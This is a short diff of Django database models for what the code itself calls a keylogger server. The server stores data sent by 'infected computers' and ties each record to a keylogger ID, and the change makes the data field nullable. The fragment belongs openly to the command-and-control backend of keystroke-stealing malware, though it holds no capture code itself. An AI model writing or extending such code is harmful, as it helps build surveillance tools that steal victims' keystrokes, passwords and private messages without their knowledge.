@@ -11,7 +11,7 @@ class KeyloggerID(models.Model):
 
 class KeyloggerData(models.Model):
     '''Data that ifected computers send to server'''
-    data = models.CharField(max_length=1000, verbose_name='Data')
+    data = models.CharField(max_length=1000, verbose_name='Data', null=True)
     date = models.DateTimeField(verbose_name='Date')
     keylogger_ref = models.ForeignKey(KeyloggerID,on_delete=models.CASCADE)
 
